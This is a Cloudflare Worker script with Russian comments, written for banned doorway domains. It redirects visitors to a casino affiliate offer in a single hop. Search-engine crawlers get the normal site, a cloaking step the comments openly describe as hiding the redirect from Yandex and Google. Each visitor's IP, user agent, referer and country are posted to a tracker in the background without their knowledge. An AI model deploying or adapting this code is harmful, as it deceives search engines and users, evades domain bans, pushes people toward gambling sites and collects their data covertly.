/**
 * Cloudflare Worker для забаненных доменов — увод на оффер напрямую, со статистикой.
 *
 * Посетитель уходит на оффер ОДНИМ переходом: наш домен в его цепочке не
 * появляется вообще. Клик при этом не теряется — воркер досылает его на трекер
 * фоновым запросом (waitUntil), которого посетитель не ждёт.
 *
 * Зачем так: домен-прокладку в цепочке посетителя приходится менять после
 * каждого бана. Домен, который знает только воркер, менять не нужно никогда —
 * его не видят ни посетитель, ни поисковик, ни провайдер. Постбеки партнёрки
 * и сегодня приходят на наш домен точно так же, со стороны сервера.
 *
 * clickid генерируется здесь же и уходит и в ссылку оффера, и в статистику,
 * поэтому постбек привязывается к клику как обычно.
 *
 * Роботы Яндекса и Гугла редирект не получают — им отдаётся сайт как есть, и
 * в статистику они не пишутся. Робот, которого с любой страницы (включая
 * robots.txt) мгновенно уводит на казино, — самый явный признак редирект-клоаки,
 * и видят его не по одному домену: у сети общие IP, перелинковка и один шаблон.
 *
 * НЕ ставить на домены, куда приходят постбеки партнёрок и где стоит панель:
 * постбек уйдёт в редирект и потеряется, а приходит он один раз.
 *
 * НАСТРОЙКА:
 *   1. Workers & Pages → Create Worker → вставить код → Deploy.
 *   2. Settings → Variables and Secrets:
 *        TARGET_URL     = https://combospark.top/aey3zq5oyv
 *        COLLECT_URL    = https://sitegrator-red1.top/collect.php   (можно не задавать —
 *                         тогда статистика не пишется, только редирект)
 *        COLLECT_TOKEN  = тот же, что collect_secret в config.php на сервере
 *        CAMPAIGN       = ban_direct   (слаг кампании; заведи такую в панели,
 *        GEO_ONLY       = RU   (необязательно; пусто — уводим всех, список стран —
 *                         только их, остальным отдаётся сайт)
 *                         иначе клики будут приходить под слагом, которого нет)
 *   3. Settings → Domains & Routes → на каждый забаненный домен ДВА маршрута:
 *        domain.team/*
 *        *.domain.team/*
 *      Второй обязателен: сайты стоят на сабдоменах (brand.domain.team), и без
 *      звёздочки воркер поймает только сам домен, а сайты — нет.
 */

// Запасные значения, если переменные не заводили.
const TARGET_URL_FALLBACK = 'https://combospark.top/aey3zq5oyv';
const CAMPAIGN_FALLBACK   = 'ban_direct';
const CLICKID_PARAM       = 'clickid';

// false — уводить вообще всех, включая роботов.
const SKIP_BOTS = true;

// Гео. Пусто — уводим всех, откуда бы ни пришли (так же, как было).
// Список стран через запятую в переменной GEO_ONLY (например RU,BY,KZ) означает:
// уводим только их, остальным отдаём сайт как есть.
//
// Нужно это потому, что воркер отвечает РАНЬШЕ Apache дора и его собственный
// гео-редирект (_georedir) не срабатывает вообще. Если дор уводил не всех, без
// этого списка поведение по не-целевым странам молча изменится.
const GEO_ONLY_FALLBACK = '';

// Проверка нарочно узкая. Ловить просто слово «yandex» нельзя: мобильное
// приложение Яндекса у живого человека шлёт UA с YandexSearch — такой посетитель
// остался бы на сайте вместо оффера.
const SEARCH_BOTS = /(yandex\.com\/bots|yandex(bot|mobilebot|images|imageresizer|video|media|blogs|news|direct|directdyn|market|pagechecker|webmaster|metrika|calendar|sitelinks|adnet|favicons|renderresourcesbot|screenshotbot|turbo|verticals|accessibilitybot|ontodb|vertis)\b|googlebot|adsbot-google|mediapartners-google|apis-google|feedfetcher-google|storebot-google|googleother|google-inspectiontool|google-extended|google-read-aloud|google-site-verification|google-safety)/i;

// clickid в том же виде, что делает go.php: 16 шестнадцатеричных символов.
// Формат важен — приёмник и постбек чистят значение по этому же правилу.
function makeClickId() {
  const b = new Uint8Array(8);
  crypto.getRandomValues(b);
  return [...b].map(x => x.toString(16).padStart(2, '0')).join('');
}

export default {
  async fetch(request, env, ctx) {
    const ua = request.headers.get('user-agent') || '';

    // робота поисковика не уводим и в статистику не пишем
    if (SKIP_BOTS && SEARCH_BOTS.test(ua)) return fetch(request);

    // не наше гео — отдаём сайт как есть
    const geoOnly = String((env && env.GEO_ONLY) || GEO_ONLY_FALLBACK)
      .toUpperCase().split(/[\s,;]+/).filter(Boolean);
    if (geoOnly.length) {
      const country = (request.headers.get('cf-ipcountry') || '').toUpperCase();
      if (!geoOnly.includes(country)) return fetch(request);
    }

    const url     = new URL(request.url);
    const clickid = makeClickId();

    // ---- адрес оффера ----
    let target = String((env && env.TARGET_URL) || TARGET_URL_FALLBACK).trim();
    let dest;
    try { dest = new URL(target); }
    catch (e) { dest = new URL(TARGET_URL_FALLBACK); }   // кривая переменная не должна ронять домен
    if (!dest.searchParams.has(CLICKID_PARAM)) dest.searchParams.set(CLICKID_PARAM, clickid);

    // ---- клик на трекер, фоном ----
    // Посетитель этого не ждёт: waitUntil держит запрос живым уже после того,
    // как ответ с редиректом ушёл. Трекер лёг — посетитель всё равно на оффере,
    // потеряется только строка статистики.
    const collect = env && env.COLLECT_URL;
    if (collect && ctx && ctx.waitUntil) {
      const body = new URLSearchParams({
        t:   String((env && env.COLLECT_TOKEN) || ''),
        l:   String((env && env.CAMPAIGN) || CAMPAIGN_FALLBACK),
        s:   url.hostname,                     // сабдомен дора — источник
        lp:  url.pathname,                     // страница, с которой ушли
        cid: clickid,
        ua,
        ref: request.headers.get('referer') || '',
        ip:  request.headers.get('cf-connecting-ip') || '',
        c:   request.headers.get('cf-ipcountry') || '',
        h:   url.hostname,                     // домен, на который пришёл клик
      });
      ctx.waitUntil(
        fetch(collect, {
          method: 'POST',
          headers: { 'content-type': 'application/x-www-form-urlencoded' },
          body: body.toString(),
        }).catch(() => {})                     // недоступность трекера не касается посетителя
      );
    }

    return Response.redirect(dest.toString(), 302);
  },
};
